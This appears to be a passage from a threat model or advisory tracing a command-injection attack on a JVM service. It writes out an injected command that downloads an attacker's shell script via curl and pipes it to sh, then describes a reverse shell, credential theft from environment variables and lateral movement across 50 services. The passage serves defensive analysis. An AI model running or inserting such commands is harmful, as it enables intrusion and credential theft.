  - The JVM process executes sh -c 'echo Landscape result for x;curl http://attacker.example/shell.sh|sh', downloading and
    running the attacker's shell script as the service account user.
  - The reverse shell script establishes an outbound connection to the attacker's listener, granting interactive OS access
    with the service account's filesystem and network privileges.
  - From the host, the attacker reads service-to-service credentials mounted as environment variables or config files, enabling
    lateral movement to all 50 services in the landscape.
